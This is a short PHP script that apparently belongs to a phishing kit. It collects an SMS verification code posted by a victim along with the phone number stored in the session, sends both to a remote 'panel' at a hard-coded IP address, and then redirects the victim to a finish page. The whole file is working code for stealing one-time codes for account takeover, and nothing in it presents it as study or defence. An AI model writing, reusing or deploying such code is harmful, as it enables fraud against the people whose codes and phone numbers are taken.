<?php
session_start();


$sms = @$_POST['sms'];
$phone = $_SESSION['phone'];

if ($sms == "") {
  echo '<meta http-equiv="refresh" content="0; URL=4.php?error1">';
    die();
}


$test = @file_get_contents("http://86.106.131.107/panel/a.php?sms=$phone,$sms");        // here goes the panel

  echo '<meta http-equiv="refresh" content="0; URL=finish2.php">';
    die();
?>